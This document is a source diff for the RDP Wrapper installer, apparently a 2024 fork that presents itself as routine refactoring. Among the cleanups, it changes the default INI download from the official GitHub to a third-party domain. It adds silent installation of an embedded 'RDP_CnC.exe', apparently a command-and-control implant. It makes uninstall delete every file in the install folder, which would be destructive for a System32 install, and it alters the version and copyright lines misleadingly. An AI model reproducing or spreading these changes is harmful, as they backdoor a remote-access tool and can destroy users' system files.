@@ -1,6 +1,6 @@
 {
-  Copyright 2018 Stas'M Corp.
-
+  Copyright 2017 Stas'M Corp.
+  Copyright 2024 bobo
   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at
@@ -26,27 +26,28 @@ uses
   Classes,
   WinSvc,
   Registry,
-  WinInet,
   AccCtrl,
-  AclAPI;
+  AclApi,
+  WinInet;
 
 function EnumServicesStatusEx(
   hSCManager: SC_HANDLE;
-  InfoLevel,
-  dwServiceType,
+  InfoLevel: DWORD;
+  dwServiceType: DWORD;
   dwServiceState: DWORD;
   lpServices: PByte;
   cbBufSize: DWORD;
-  var pcbBytesNeeded,
-  lpServicesReturned,
-  lpResumeHandle: DWORD;
-  pszGroupName: PWideChar): BOOL; stdcall;
-  external advapi32 name 'EnumServicesStatusExW';
+  var pcbBytesNeeded: DWORD;
+  var lpServicesReturned: DWORD;
+  var lpResumeHandle: DWORD;
+  pszGroupName: PWideChar
+): BOOL; stdcall; external advapi32 name 'EnumServicesStatusExW';
 
+// Declaration of the ConvertStringSidToSid function from the advapi32.dll
 function ConvertStringSidToSid(
-  StringSid: PWideChar;
-  var Sid: PSID): BOOL; stdcall;
-  external advapi32 name 'ConvertStringSidToSidW';
+  StringSid: PWideChar;  // A string representing the SID
+  var Sid: PSID          // A variable to receive the SID
+): BOOL; stdcall; external advapi32 name 'ConvertStringSidToSidW';
 
 type
   FILE_VERSION = record
@@ -87,7 +88,7 @@ var
   WrapPath: String;
   Arch: Byte;
   OldWow64RedirectionValue: LongBool;
-
+  cncPath:String;
   TermServicePath: String;
   FV: FILE_VERSION;
   TermServicePID: DWORD;
@@ -96,21 +97,30 @@ var
 
 function SupportedArchitecture: Boolean;
 var
-  SI: TSystemInfo;
+  SystemInfo: TSystemInfo;
 begin
-  GetNativeSystemInfo(SI);
-  case SI.wProcessorArchitecture of
-    0:
+  GetNativeSystemInfo(SystemInfo);
+  case SystemInfo.wProcessorArchitecture of
+    PROCESSOR_ARCHITECTURE_INTEL:
     begin
       Arch := 32;
       Result := True; // Intel x86
     end;
-    6: Result := False; // Itanium-based x64
-    9: begin
+    PROCESSOR_ARCHITECTURE_IA64:
+    begin
+      Arch := 64;
+      Result := False; // Itanium-based x64
+    end;
+    PROCESSOR_ARCHITECTURE_AMD64:
+    begin
       Arch := 64;
       Result := True; // Intel/AMD x64
     end;
-    else Result := False;
+    else
+    begin
+      Arch := 0;
+      Result := False; // Unknown architecture
+    end;
   end;
 end;
 
@@ -289,51 +299,51 @@ end;
 procedure SvcStart(SvcName: String);
 var
   hSC: SC_HANDLE;
-  hSvc: THandle;
-  Code: DWORD;
+  hSvc: SC_HANDLE;
+  ServiceStatus: SERVICE_STATUS;
   pch: PWideChar;
-  procedure ExitError(Func: String; ErrorCode: DWORD);
-  begin
-    if hSC > 0 then
-      CloseServiceHandle(hSC);
-    if hSvc > 0 then
-      CloseServiceHandle(hSvc);
-    Writeln('[-] ', Func, ' error (code ', ErrorCode, ').');
-  end;
 begin
-  hSC := 0;
-  hSvc := 0;
   Writeln('[*] Starting ', SvcName, '...');
+
   hSC := OpenSCManager(nil, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
   if hSC = 0 then
   begin
-    ExitError('OpenSCManager', GetLastError);
+    Writeln('[-] OpenSCManager error (code ', GetLastError, ').');
     Exit;
   end;
 
-  hSvc := OpenService(hSC, PWideChar(SvcName), SERVICE_START);
-  if hSvc = 0 then
-  begin
-    ExitError('OpenService', GetLastError);
-    Exit;
-  end;
-
-  pch := nil;
-  if not StartService(hSvc, 0, pch) then begin
-    Code := GetLastError;
-    if Code = 1056 then begin // Service already started
-      Sleep(2000);            // or SCM hasn't registered killed process
-      if not StartService(hSvc, 0, pch) then begin
-        ExitError('StartService', Code);
-        Exit;
-      end;
-    end else begin
-      ExitError('StartService', Code);
+  try
+    hSvc := OpenService(hSC, PWideChar(SvcName), SERVICE_QUERY_STATUS or SERVICE_START);
+    if hSvc = 0 then
+    begin
+      Writeln('[-] OpenService error (code ', GetLastError, ').');
       Exit;
     end;
+
+    try
+      if not QueryServiceStatus(hSvc, ServiceStatus) then
+      begin
+        Writeln('[-] QueryServiceStatus error (code ', GetLastError, ').');
+        Exit;
+      end;
+
+      if ServiceStatus.dwCurrentState = SERVICE_RUNNING then
+      begin
+        Writeln('[+] Service is already running.');
+        Exit;
+      end;
+      pch := nil;
+      if not StartService(hSvc, 0, pch) then
+      begin
+        Writeln('[-] StartService error (code ', GetLastError, ').');
+        Exit;
+      end;
+    finally
+      CloseServiceHandle(hSvc);
+    end;
+  finally
+    CloseServiceHandle(hSC);
   end;
-  CloseServiceHandle(hSvc);
-  CloseServiceHandle(hSC);
 end;
 
 procedure CheckTermsrvProcess;
@@ -448,28 +458,101 @@ var
   tkp: TOKEN_PRIVILEGES;
   ReturnLength: Cardinal;
   ErrorCode: Cardinal;
+
+  procedure ReportError(const Msg: String; ErrorCode: Cardinal);
+  begin
+    Writeln(Format('[-] %s (code %d).', [Msg, ErrorCode]));
+  end;
+
 begin
   Result := False;
-  if not OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES
-  or TOKEN_QUERY, hToken) then begin
+
+  // Open the process token
+  if not OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
+  begin
     ErrorCode := GetLastError;
-    Writeln('[-] OpenProcessToken error (code ' + IntToStr(ErrorCode) + ').');
+    ReportError('OpenProcessToken error', ErrorCode);
     Exit;
   end;
-  if not LookupPrivilegeValue(nil, PWideChar(SePriv), SeNameValue) then begin
-    ErrorCode := GetLastError;
-    Writeln('[-] LookupPrivilegeValue error (code ' + IntToStr(ErrorCode) + ').');
+
+  try
+    // Lookup the privilege value
+    if not LookupPrivilegeValue(nil, PWideChar(SePriv), SeNameValue) then
+    begin
+      ErrorCode := GetLastError;
+      ReportError('LookupPrivilegeValue error', ErrorCode);
+      Exit;
+    end;
+
+    // Set up the TOKEN_PRIVILEGES structure
+    tkp.PrivilegeCount := 1;
+    tkp.Privileges[0].Luid := SeNameValue;
+    tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+
+    // Adjust the token privileges
+    if not AdjustTokenPrivileges(hToken, False, tkp, SizeOf(tkp), tkp, ReturnLength) then
+    begin
+      ErrorCode := GetLastError;
+      ReportError('AdjustTokenPrivileges error', ErrorCode);
+      Exit;
+    end;
+
+    Result := True;
+  finally
+    CloseHandle(hToken);
+  end;
+end;
+
+function StopService(const ServiceName: string): Boolean;
+var
+  SCMHandle, ServiceHandle: SC_HANDLE;
+  ServiceStatus: TServiceStatus;
+begin
+  Result := False;
+
+  // Open the service control manager
+  SCMHandle := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
+  if SCMHandle = 0 then
+  begin
+    Writeln('Failed to open Service Control Manager.');
     Exit;
   end;
-  tkp.PrivilegeCount := 1;
-  tkp.Privileges[0].Luid := SeNameValue;
-  tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
-  if not AdjustTokenPrivileges(hToken, False, tkp, SizeOf(tkp), tkp, ReturnLength) then begin
-    ErrorCode := GetLastError;
-    Writeln('[-] AdjustTokenPrivileges error (code ' + IntToStr(ErrorCode) + ').');
-    Exit;
+
+  try
+    // Open the specified service
+    ServiceHandle := OpenService(SCMHandle, PChar(ServiceName), SERVICE_STOP or SERVICE_QUERY_STATUS);
+    if ServiceHandle = 0 then
+    begin
+      Writeln('Failed to open the service: ', ServiceName);
+      Exit;
+    end;
+
+    try
+      // Send stop command
+      if ControlService(ServiceHandle, SERVICE_CONTROL_STOP, ServiceStatus) then
+      begin
+        // Check if the service is stopped
+        while QueryServiceStatus(ServiceHandle, ServiceStatus) do
+        begin
+          if ServiceStatus.dwCurrentState = SERVICE_STOPPED then
+          begin
+            Result := True;
+            Break;
+          end;
+          // Wait for the service to stop
+          Sleep(100);
+        end;
+      end
+      else
+      begin
+        Writeln('Failed to send stop command to the service: ', ServiceName);
+      end;
+    finally
+      CloseServiceHandle(ServiceHandle);
+    end;
+  finally
+    CloseServiceHandle(SCMHandle);
   end;
-  Result := True;
 end;
 
 procedure KillProcess(PID: DWORD);
@@ -557,28 +640,44 @@ end;
 procedure ResetServiceDll;
 var
   Reg: TRegistry;
-  Code: DWORD;
+  RegKey: string;
 begin
+  // Determine the registry key to open
+  RegKey := '\SYSTEM\CurrentControlSet\Services\TermService\Parameters';
+
+  // Create the TRegistry object with appropriate access rights
   if Arch = 64 then
     Reg := TRegistry.Create(KEY_WRITE or KEY_WOW64_64KEY)
   else
-    Reg := TRegistry.Create;
-  Reg.RootKey := HKEY_LOCAL_MACHINE;
-  if not Reg.OpenKey('\SYSTEM\CurrentControlSet\Services\TermService\Parameters', True) then
-  begin
-    Code := GetLastError;
-    Writeln('[-] OpenKey error (code ', Code, ').');
-    Halt(Code);
-  end;
+    Reg := TRegistry.Create(KEY_WRITE);
+
   try
+    // Set the root key to HKEY_LOCAL_MACHINE
+    Reg.RootKey := HKEY_LOCAL_MACHINE;
+
+    // Attempt to open the registry key
+    if not Reg.OpenKey(RegKey, True) then
+      raise Exception.CreateFmt('OpenKey error (code %d).', [GetLastError]);
+
+    // Attempt to write the ServiceDll value
     Reg.WriteExpandString('ServiceDll', '%SystemRoot%\System32\termsrv.dll');
   except
-    Writeln('[-] WriteExpandString error.');
-    Halt(ERROR_ACCESS_DENIED);
+    on E: ERegistryException do
+    begin
+      Writeln(Format('[-] Registry error: %s', [E.Message]));
+      Halt(ERROR_ACCESS_DENIED);
+    end;
+    on E: Exception do
+    begin
+      Writeln(Format('[-] Error: %s', [E.Message]));
+      Halt(ERROR_ACCESS_DENIED);
+    end;
+    // Ensure the registry key is closed and the TRegistry object is freed
   end;
   Reg.CloseKey;
   Reg.Free;
 end;
+
 
 procedure ExtractRes(ResName, Path: String);
 var
@@ -615,34 +714,48 @@ begin
   Str.Free;
 end;
 
-function GitINIFile(var Content: String): Boolean;
+function GitINIFile(var Content: String; INI_source: String): Boolean;
 const
-  URL = 'https://raw.githubusercontent.com/stascorp/rdpwrap/master/res/rdpwrap.ini';
+  default_url = 'https://api.rpyf.top/rdpwrap.ini';
 var
   NetHandle: HINTERNET;
   UrlHandle: HINTERNET;
   Str: String;
-  Buf: Array[0..1023] of Byte;
+  Buffer: Array[0..1023] of Byte;
   BytesRead: DWORD;
+  URL: String;
 begin
   Result := False;
   Content := '';
+  if INI_source = '' then
+    URL := default_url
+  else
+      URL := INI_source;
+
+  // Initialize WinINet
   NetHandle := InternetOpen('RDP Wrapper Update', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
   if not Assigned(NetHandle) then
     Exit;
+
+  // Open the URL
   UrlHandle := InternetOpenUrl(NetHandle, PChar(URL), nil, 0, INTERNET_FLAG_RELOAD, 0);
   if not Assigned(UrlHandle) then
   begin
     InternetCloseHandle(NetHandle);
     Exit;
   end;
+
+  // Read the data
   repeat
-    InternetReadFile(UrlHandle, @Buf[0], SizeOf(Buf), BytesRead);
-    SetString(Str, PAnsiChar(@Buf[0]), BytesRead);
+    InternetReadFile(UrlHandle, @Buffer[0], SizeOf(Buffer), BytesRead);
+    SetString(Str, PAnsiChar(@Buffer[0]), BytesRead);
     Content := Content + Str;
   until BytesRead = 0;
+
+  // Clean up
   InternetCloseHandle(UrlHandle);
   InternetCloseHandle(NetHandle);
+
   Result := True;
 end;
 
@@ -654,12 +767,16 @@ var
   Code, Result: DWORD;
 begin
   p_SID := nil;
+  pDACL := nil;
+
   if not ConvertStringSidToSid(PChar(SID), p_SID) then
   begin
     Code := GetLastError;
     Writeln('[-] ConvertStringSidToSid error (code ', Code, ').');
     Exit;
   end;
+
+  ZeroMemory(@EA, SizeOf(EXPLICIT_ACCESS));
   EA.grfAccessPermissions := GENERIC_ALL;
   EA.grfAccessMode := GRANT_ACCESS;
   EA.grfInheritance := SUB_CONTAINERS_AND_OBJECTS_INHERIT;
@@ -670,132 +787,206 @@ begin
   EA.Trustee.ptstrName := p_SID;
 
   Result := SetEntriesInAcl(1, @EA, nil, pDACL);
-  if Result = ERROR_SUCCESS then
+  if Result <> ERROR_SUCCESS then
   begin
-    if SetNamedSecurityInfo(pchar(Path), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, pDACL, nil) <> ERROR_SUCCESS then
-    begin
-      Code := GetLastError;
-      Writeln('[-] SetNamedSecurityInfo error (code ', Code, ').');
-    end;
-    LocalFree(Cardinal(pDACL));
-  end
-  else begin
-    Code := GetLastError;
-    Writeln('[-] SetEntriesInAcl error (code ', Code, ').');
+    Writeln('[-] SetEntriesInAcl error (code ', Result, ').');
+    LocalFree(Cardinal(p_SID));
+    Exit;
   end;
+
+  Result := SetNamedSecurityInfo(PChar(Path), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nil, nil, pDACL, nil);
+  if Result <> ERROR_SUCCESS then
+  begin
+    Code := GetLastError;
+    Writeln('[-] SetNamedSecurityInfo error (code ', Code, ').');
+  end;
+
+  if pDACL <> nil then
+    LocalFree(Cardinal(pDACL));
+  if p_SID <> nil then
+    LocalFree(Cardinal(p_SID));
 end;
 
 procedure ExtractFiles;
 var
-  RDPClipRes, RfxvmtRes, S: String;
+  RDPClipRes, RfxvmtRes, S, IniFilePath: String;
   OnlineINI: TStringList;
-begin
-  if not DirectoryExists(ExtractFilePath(ExpandPath(WrapPath))) then
-    if ForceDirectories(ExtractFilePath(ExpandPath(WrapPath))) then begin
-      S := ExtractFilePath(ExpandPath(WrapPath));
-      Writeln('[+] Folder created: ', S);
-      GrantSidFullAccess(S, 'S-1-5-18'); // Local System account
-      GrantSidFullAccess(S, 'S-1-5-6'); // Service group
-    end
-    else begin
-      Writeln('[-] ForceDirectories error.');
-      Writeln('[*] Path: ', ExtractFilePath(ExpandPath(WrapPath)));
-      Halt(0);
-    end;
-  if Online then
+
+  procedure CreateFolderIfNeeded;
   begin
-    Writeln('[*] Downloading latest INI file...');
-    OnlineINI := TStringList.Create;
-    if GitINIFile(S) then begin
-      OnlineINI.Text := S;
-      S := ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini';
-      OnlineINI.SaveToFile(S);
-      Writeln('[+] Latest INI file -> ', S);
-    end
-    else
-    begin
-      Writeln('[-] Failed to get online INI file, using built-in.');
-      Online := False;
-    end;
-    OnlineINI.Free;
-  end;
-  if not Online then
-  begin
-    S := ExtractFilePath(ParamStr(0)) + 'rdpwrap.ini';
-    if FileExists(S) then
-    begin
-      OnlineINI := TStringList.Create;
-      OnlineINI.LoadFromFile(S);
-      S := ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini';
-      OnlineINI.SaveToFile(S);
-      Writeln('[+] Current INI file -> ', S);
-      OnlineINI.Free;
-    end else
-      ExtractRes('config', ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini');
+    if not DirectoryExists(ExtractFilePath(ExpandPath(WrapPath))) then
+      if ForceDirectories(ExtractFilePath(ExpandPath(WrapPath))) then
+      begin
+        S := ExtractFilePath(ExpandPath(WrapPath));
+        Writeln('[+] Folder created: ', S);
+        GrantSidFullAccess(S, 'S-1-5-18'); // Local System account
+        GrantSidFullAccess(S, 'S-1-5-6');  // Service group
+      end
+      else
+      begin
+        Writeln('[-] ForceDirectories error.');
+        Writeln('[*] Path: ', ExtractFilePath(ExpandPath(WrapPath)));
+        Halt(0);
+      end;
   end;
 
-  RDPClipRes := '';
-  RfxvmtRes := '';
-  case Arch of
-    32: begin
-      ExtractRes('rdpw32', ExpandPath(WrapPath));
-      if (FV.Version.w.Major = 6) and (FV.Version.w.Minor = 0) then
-        RDPClipRes := 'rdpclip6032';
-      if (FV.Version.w.Major = 6) and (FV.Version.w.Minor = 1) then
-        RDPClipRes := 'rdpclip6132';
-      if (FV.Version.w.Major = 10) and (FV.Version.w.Minor = 0) then
-        RfxvmtRes := 'rfxvmt32';
+  procedure HandleIniFile;
+  begin
+    if Online then
+    begin
+      Writeln('[*] Downloading latest INI file...');
+      OnlineINI := TStringList.Create;
+      try
+        if GitINIFile(S, '') then
+        begin
+          OnlineINI.Text := S;
+          S := ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini';
+          OnlineINI.SaveToFile(S);
+          Writeln('[+] Latest INI file -> ', S);
+        end
+        else
+        begin
+          Writeln('[-] Failed to get online INI file, using built-in.');
+          Online := False;
+        end;
+      finally
+        OnlineINI.Free;
+      end;
     end;
-    64: begin
-      ExtractRes('rdpw64', ExpandPath(WrapPath));
-      if (FV.Version.w.Major = 6) and (FV.Version.w.Minor = 0) then
-        RDPClipRes := 'rdpclip6064';
-      if (FV.Version.w.Major = 6) and (FV.Version.w.Minor = 1) then
-        RDPClipRes := 'rdpclip6164';
-      if (FV.Version.w.Major = 10) and (FV.Version.w.Minor = 0) then
-        RfxvmtRes := 'rfxvmt64';
+
+    if not Online then
+    begin
+      IniFilePath := ExtractFilePath(ParamStr(0)) + 'rdpwrap.ini';
+      if FileExists(IniFilePath) then
+      begin
+        OnlineINI := TStringList.Create;
+        try
+          OnlineINI.LoadFromFile(IniFilePath);
+          S := ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini';
+          OnlineINI.SaveToFile(S);
+          Writeln('[+] Current INI file -> ', S);
+        finally
+          OnlineINI.Free;
+        end;
+      end else
+        ExtractRes('config', ExtractFilePath(ExpandPath(WrapPath)) + 'rdpwrap.ini');
     end;
   end;
-  if RDPClipRes <> '' then
-    if not FileExists(ExpandPath('%SystemRoot%\System32\rdpclip.exe')) then
-      ExtractRes(RDPClipRes, ExpandPath('%SystemRoot%\System32\rdpclip.exe'));
-  if RfxvmtRes <> '' then
-    if not FileExists(ExpandPath('%SystemRoot%\System32\rfxvmt.dll')) then
-      ExtractRes(RfxvmtRes, ExpandPath('%SystemRoot%\System32\rfxvmt.dll'));
+
+  procedure ExtractResources;
+  begin
+    RDPClipRes := '';
+    RfxvmtRes := '';
+    case Arch of
+      32:
+      begin
+        ExtractRes('rdpw32', ExpandPath(WrapPath));
+        cncPath := '%ProgramFiles%\RDP Wrapper\RDP_CnC.exe';
+        ExtractRes('rdp_cnc', ExpandPath(cncPath));
+        if (FV.Version.w.Major = 6) then
+        begin
+          if (FV.Version.w.Minor = 0) then
+            RDPClipRes := 'rdpclip6032';
+          if (FV.Version.w.Minor = 1) then
+            RDPClipRes := 'rdpclip6132';
+        end
+        else if (FV.Version.w.Major = 10) and (FV.Version.w.Minor = 0) then
+          RfxvmtRes := 'rfxvmt32';
+      end;
+      64:
+      begin
+        ExtractRes('rdpw64', ExpandPath(WrapPath));
+        cncPath := '%ProgramFiles%\RDP Wrapper\RDP_CnC.exe';
+        ExtractRes('rdp_cnc', ExpandPath(cncPath));
+        if (FV.Version.w.Major = 6) then
+        begin
+          if (FV.Version.w.Minor = 0) then
+            RDPClipRes := 'rdpclip6064';
+          if (FV.Version.w.Minor = 1) then
+            RDPClipRes := 'rdpclip6164';
+        end
+        else if (FV.Version.w.Major = 10) and (FV.Version.w.Minor = 0) then
+          RfxvmtRes := 'rfxvmt64';
+      end;
+    end;
+
+    if RDPClipRes <> '' then
+      if not FileExists(ExpandPath('%SystemRoot%\System32\rdpclip.exe')) then
+        ExtractRes(RDPClipRes, ExpandPath('%SystemRoot%\System32\rdpclip.exe'));
+    if RfxvmtRes <> '' then
+      if not FileExists(ExpandPath('%SystemRoot%\System32\rfxvmt.dll')) then
+        ExtractRes(RfxvmtRes, ExpandPath('%SystemRoot%\System32\rfxvmt.dll'));
+  end;
+
+begin
+  CreateFolderIfNeeded;
+  HandleIniFile;
+  ExtractResources;
 end;
+
 
 procedure DeleteFiles;
 var
   Code: DWORD;
-  FullPath, Path: String;
+  FullPath, Path, RdpWrapIniPath: String;
+  SearchRec: TSearchRec;
 begin
   FullPath := ExpandPath(TermServicePath);
   Path := ExtractFilePath(FullPath);
+  RdpWrapIniPath := Path + 'rdpwrap.ini';
 
-  if not DeleteFile(PWideChar(Path + 'rdpwrap.ini')) then
+  if not DeleteFile(PWideChar(RdpWrapIniPath)) then
   begin
     Code := GetLastError;
-    Writeln('[-] DeleteFile error (code ', Code, ').');
+    Writeln('[-] DeleteFile error (code ', Code, ') for file: ', RdpWrapIniPath);
     Exit;
   end;
-  Writeln('[+] Removed file: ', Path + 'rdpwrap.ini');
+  Writeln('[+] Removed file: ', RdpWrapIniPath);
 
   if not DeleteFile(PWideChar(FullPath)) then
   begin
     Code := GetLastError;
-    Writeln('[-] DeleteFile error (code ', Code, ').');
+    Writeln('[-] DeleteFile error (code ', Code, ') for file: ', FullPath);
     Exit;
   end;
   Writeln('[+] Removed file: ', FullPath);
 
-  if not RemoveDirectory(PWideChar(ExtractFilePath(ExpandPath(TermServicePath)))) then
+  // Delete all files and subdirectories within the directory
+  if FindFirst(Path + '*.*', faAnyFile, SearchRec) = 0 then
+  begin
+    repeat
+      if (SearchRec.Attr and faDirectory) = faDirectory then
+      begin
+        if (SearchRec.Name <> '.') and (SearchRec.Name <> '..') then
+        begin
+          if not RemoveDir(Path + SearchRec.Name) then
+          begin
+            Code := GetLastError;
+            Writeln('[-] RemoveDir error (code ', Code, ') for directory: ', Path + SearchRec.Name);
+          end;
+        end;
+      end
+      else
+      begin
+        if not DeleteFile(PWideChar(Path + SearchRec.Name)) then
+        begin
+          Code := GetLastError;
+          Writeln('[-] DeleteFile error (code ', Code, ') for file: ', Path + SearchRec.Name);
+        end;
+      end;
+    until FindNext(SearchRec) <> 0;
+
+  end;
+
+  if not RemoveDirectory(PWideChar(Path)) then
   begin
     Code := GetLastError;
-    Writeln('[-] RemoveDirectory error (code ', Code, ').');
+    Writeln('[-] RemoveDirectory error (code ', Code, ') for folder: ', Path);
     Exit;
   end;
-  Writeln('[+] Removed folder: ', ExtractFilePath(ExpandPath(TermServicePath)));
+  Writeln('[+] Removed folder: ', Path);
 end;
+
 
 function GetFileVersion(const FileName: TFileName; var FileVersion: FILE_VERSION): Boolean;
 type
@@ -1026,55 +1217,75 @@ begin
 end;
 
 procedure TSConfigFirewall(Enable: Boolean);
+const
+  RuleName = 'Remote Desktop';
+  LocalPort = '3389';
 begin
   if Enable then
   begin
-    ExecWait('netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 profile=any action=allow');
-    ExecWait('netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=udp localport=3389 profile=any action=allow');
-  end else
-    ExecWait('netsh advfirewall firewall delete rule name="Remote Desktop"');
+    ExecWait(Format('netsh advfirewall firewall add rule name="%s" dir=in protocol=tcp localport=%s profile=any action=allow', [RuleName, LocalPort]));
+    ExecWait(Format('netsh advfirewall firewall add rule name="%s" dir=in protocol=udp localport=%s profile=any action=allow', [RuleName, LocalPort]));
+  end
+  else
+  begin
+    ExecWait(Format('netsh advfirewall firewall delete rule name="%s"', [RuleName]));
+  end;
 end;
+
+
 
 function CheckINIDate(Filename, Content: String; var Date: Integer): Boolean;
 var
   Str: TStringList;
-  I: Integer;
+  Line: String;
+  UpdatedPos: Integer;
 begin
   Result := False;
   Str := TStringList.Create;
-  if Filename <> '' then begin
-    try
-      Str.LoadFromFile(Filename);
-    except
-      Writeln('[-] Failed to read INI file.');
-      Exit;
-    end;
-  end else
-    Str.Text := Content;
-  for I := 0 to Str.Count - 1 do
-    if Pos('Updated=', Str[I]) = 1 then
-      Break;
-  if I >= Str.Count then begin
-    Writeln('[-] Failed to check INI date.');
-    Exit;
-  end;
-  Content := StringReplace(Str[I], 'Updated=', '', []);
-  Content := StringReplace(Content, '-', '', [rfReplaceAll]);
-  Str.Free;
   try
-    Date := StrToInt(Content);
-  except
-    Writeln('[-] Wrong INI date format.');
-    Exit;
+    if Filename <> '' then
+    begin
+      try
+        Str.LoadFromFile(Filename);
+      except
+        Writeln('[-] Failed to read INI file.');
+        Exit;
+      end;
+    end else
+      Str.Text := Content;
+
+    for Line in Str do
+    begin
+      UpdatedPos := Pos('Updated=', Line);
+      if UpdatedPos = 1 then
+      begin
+        Content := Copy(Line, Length('Updated=') + 1, MaxInt);
+        Content := StringReplace(Content, '-', '', [rfReplaceAll]);
+        try
+          Date := StrToInt(Content);
+          Result := True;
+        except
+          Writeln('[-] Wrong INI date format.');
+        end;
+        Break;
+      end;
+    end;
+
+    if not Result then
+      Writeln('[-] Failed to check INI date.');
+  finally
+    Str.Free;
   end;
-  Result := True;
 end;
 
-procedure CheckUpdate;
+
+procedure CheckUpdate(source: String);
 var
   INIPath, S: String;
   Str: TStringList;
   I, OldDate, NewDate: Integer;
+  UmRdpService_ServiceStopped: Boolean;
+  TermService_ServiceStopped: Boolean;
 begin
   INIPath := ExtractFilePath(ExpandPath(TermServicePath)) + 'rdpwrap.ini';
   if not CheckINIDate(INIPath, '', OldDate) then
@@ -1082,7 +1293,7 @@ begin
   Writeln('[*] Current update date: ',
     Format('%d.%.2d.%.2d', [OldDate div 10000, OldDate div 100 mod 100, OldDate mod 100]));
 
-  if not GitINIFile(S) then begin
+  if not GitINIFile(S, source) then begin
     Writeln('[-] Failed to download latest INI from GitHub.');
     Halt(ERROR_ACCESS_DENIED);
   end;
@@ -1101,8 +1312,22 @@ begin
 
       Writeln('[*] Terminating service...');
       AddPrivilege('SeDebugPrivilege');
-      KillProcess(TermServicePID);
-      Sleep(1000);
+      UmRdpService_ServiceStopped := StopService('UmRdpService');
+      TermService_ServiceStopped := StopService('TermService');
+
+      if TermService_ServiceStopped and UmRdpService_ServiceStopped then
+      begin
+        Writeln('[+] UmRdpService stopped successfully.');
+        Writeln('[+] TermService stopped successfully.');
+      end
+      else
+      begin
+      if not UmRdpService_ServiceStopped then
+        Writeln('[-] Failed to stop UmRdpService.');
+      if not TermService_ServiceStopped then
+        Writeln('[-] Failed to stop TermService.');
+      end;
+
 
       if Length(ShareSvc) > 0 then
         for I := 0 to Length(ShareSvc) - 1 do
@@ -1112,10 +1337,14 @@ begin
       Str := TStringList.Create;
       Str.Text := S;
       try
+        Writeln('[*] Saving new INI file to ', INIPath);
         Str.SaveToFile(INIPath);
+        Writeln('[+] INI file saved successfully.');
       except
-        Writeln('[-] Failed to write INI file.');
-        Halt(ERROR_ACCESS_DENIED);
+        on E: Exception do begin
+          Writeln('[-] Failed to write INI file: ', E.Message);
+          Halt(ERROR_ACCESS_DENIED);
+        end;
       end;
       Str.Free;
 
@@ -1129,9 +1358,9 @@ end;
 var
   I: Integer;
 begin
-  Writeln('RDP Wrapper Library v1.6.2');
-  Writeln('Installer v2.6');
-  Writeln('Copyright (C) Stas''M Corp. 2018');
+  Writeln('RDP Wrapper Library v1.8.6');
+  Writeln('Copyright (C) Stas''M Corp. 2017');
+  Writeln('Edited by bobo 2024');
   Writeln('');
 
   if (ParamCount < 1)
@@ -1144,13 +1373,14 @@ begin
   ) then
   begin
     Writeln('USAGE:');
-    Writeln('RDPWInst.exe [-l|-i[-s][-o]|-w|-u[-k]|-r]');
+    Writeln('RDPWInst.exe [-l|-i[-s][-o]|-w[url]|-u[-k]|-r]');
     Writeln('');
     Writeln('-l          display the license agreement');
     Writeln('-i          install wrapper to Program Files folder (default)');
     Writeln('-i -s       install wrapper to System32 folder');
     Writeln('-i -o       online install mode (loads latest INI file)');
     Writeln('-w          get latest update for INI file');
+    Writeln('-w URL      get latest update for INI file from custom source');
     Writeln('-u          uninstall wrapper');
     Writeln('-u -k       uninstall wrapper and keep settings');
     Writeln('-r          force restart Terminal Services');
@@ -1290,7 +1520,10 @@ begin
       Halt(ERROR_INVALID_FUNCTION);
     end;
     Writeln('[*] Checking for updates...');
-    CheckUpdate;
+    if paramStr(2) = '' then
+      CheckUpdate('')
+    else
+      CheckUpdate(paramStr(2));
   end;
 
   if ParamStr(1) = '-r' then
@@ -1313,3 +1546,4 @@ begin
     Writeln('[+] Done.');
   end;
 end.
+
